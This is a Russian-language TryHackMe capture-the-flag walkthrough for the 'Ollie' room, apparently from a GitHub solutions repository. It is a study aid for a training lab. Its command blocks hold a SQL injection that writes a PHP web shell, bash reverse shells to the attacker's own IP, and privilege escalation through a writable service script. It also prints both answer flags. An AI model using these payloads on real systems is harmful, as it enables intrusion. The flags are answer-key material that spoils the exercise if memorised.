[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Ollie](https://tryhackme.com/r/room/ollie) 

Всего 1 заданиe:
## Задание 1
Олли Юникс Монтгомери, печально известный хакерский пес, отличный игрок в красную команду. Что касается разработки...
не очень! Ходят слухи, что Олли испортил несколько файлов на сервере, чтобы обеспечить обратную совместимость. 
Возьмите управление, пока не истекло время!

Покойся с миром 01.05.2023
Пожалуйста, подождите до 3 минут, пока компьютер загрузится.

### Ответьте на вопросы ниже
Что такое флаг user.txt?
```commandline
nmap -sSCV <IP>
nc <IP> 1337
searchsploit phpipam
“ union select 1,2,3,’<?php system($_GET[“cmd”]); ?>’ into outfile ‘/var/www/html/rev.php’ -- -
/bin/bash -c “bash -i >& /dev/tcp/<my_own_IP>/4444 0>&1”
tty shell-escape
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
ctrl+z
stty raw -echo; fg
export TERM=xterm
su ollie
cat user.txt
```
```commandline
THM{Ollie_boi_is_daH_Cut3st}
```
Что такое флаг root.txt?
```commandline
find / -uid 1000 -perm -g=w -type f 2>/dev/null
cat /etc/systemd/system/feedme.service
echo '#!/bin/bash' > feedme
echo ' /bin/bash -c "bash -i >& /dev/tcp/<my_own_IP>/5555 0>&1"' >> feedme
nc -nvlp 5555
cat /root/root.txt
```
```commandline
THM{Ollie_Luvs_Chicken_Fries}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)